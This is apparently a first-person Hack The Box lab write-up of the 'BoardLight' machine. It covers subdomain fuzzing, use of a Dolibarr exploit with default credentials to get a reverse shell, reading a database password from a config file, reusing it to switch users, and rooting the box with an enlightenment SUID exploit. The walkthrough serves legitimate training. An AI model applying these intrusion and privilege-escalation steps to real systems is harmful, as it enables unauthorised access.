Starting with the Nmap scan.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -Pn -A 10.10.11.11
```
```         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 05:00 EDT
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 57.72% done; ETC: 05:01 (0:00:23 remaining)
Nmap scan report for 10.10.11.11
Host is up (0.70s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.15 seconds
```
SSH no use without username, password, or key.

HTTP site at port 80.

Clicking on the labels, the URL changes. But nothing much.
Upon trying the PHP URL tricks and checking on the website's source code, I saw an email given `info@board.htb`

This could be the domain name of the site.

I added the IP and domain name in the `/etc/hosts` file of my machine

Gobuster also doesn't help much with the directories it found. I remember doing the beginner machines on Hack The Box; with Gobuster, we can find subdomains. So I tried finding the subdomains but didn't find much.

So, instead, I used Ffuf to find the subdomains. With multiple tries, I got a subdomain.

```
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ ffuf -H "Host: FUZZ.board.htb" -u http://board.htb -w /usr/share/wordlists/wfuzz/general/common.txt -fs 15949

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/wfuzz/general/common.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 265ms]
:: Progress: [951/951] :: Job [1/1] :: 129 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```
With this wordlist, I got Status:200 for all the searches, with size 15949. I searched on ChatGPT for size 15949, and this was the output
```
If you are fuzzing for subdomains or other resources, consistent response sizes might indicate typical content served by the server.
For example, if many responses have a size of 15949 bytes, this might be the size of a standard 404 error page or another common response.
```
So, I filtered it out and got the above.

Next, upon trying to log to the subdomain `crm.board.htb`, I was not able to do so. I searched on Google about subdomains, and upon reading, I found it is possible to have the same IP for the subdomains with the domains.

So, I also added the subdomain in the `/etc/hosts` on the same IP.

And I was able to visit the subdomain.

`Customer Relationship Management is a set of integrated, data-driven software solutions that help manage, track, 
and store information related to your company's current and potential customers.` from Google.

It uses `Dolibarr 17.0.0`. So I searched for an exploit on Google and found the exploit **(CVE-2023-30253)**.

This exploit grants us a reverse shell connection. It requires a username and password to be fed while running the exploit. I searched for default credentials for Dolibarr 17.0.0
and found it to be `admin|admin`.

I ran the exploit as it was mentioned and got the reverse shell with the username `www-data`.

I searched for other users and found one: **larissa**. I also tried the basic escalation techniques but was unsuccessful.

Next, I tried to find the configuration file and found `conf.php` on the `crm.board.htb/htdocs/conf`.

The output of the file has the following.
```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php

$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
```
Database name, username, and password are available here.
I accessed the MySQL data with the command:
```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ mysql -D dolibarr -u dolibarrowner -p
Enter password:
```
```
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 51
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```
Going through the databases and trying to find something which can help me log into larissa, I didn't find anything.

Here, I saw some other writeups, and I found that using the password which was used to log in to the database will allow me to log in to Larissa.

And this should be the first thing to test: trying to log in with the known credentials because people often re-use their passwords.

```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su larissa
Enter password:
larissa@boardlight:/
```

Here also I tried the basic escalation- `sudo -l`, finding files with **SUID** permissions. I found a file `/usr/bin/vmware-user-suid-wrapper` with SUID permissions.

I searched on net for the exploit for vmware-user-suid-wrapper and found **CVE-2009-1142** to be the exploit. I couldn't find download link for this exploit so I turned to Linpeas.

But unfortunately, linpeas did not working properly. It might be some RAM issue. So I searched for more tools similar to linpeas and came across Linux Smart Enumeration.

I transferred the file to target machine and ran it. I got the outcome and this was among the outcomes:
```
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/bin/vmware-user-suid-wrapper
```
I checked for the enlightenment_ckpasswd exploit because this one contains **passwd**, and I found an exploit, which I copied to the target machine.

Changing the permissions and running the file, I got the root privilege.
```
larissa@boardlight:/tmp$ chmod 777 exploit.sh 
larissa@boardlight:/tmp$ ./exploit.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
# 
```

Again, the shell is not stable. We can stabilise the shell with the python command.
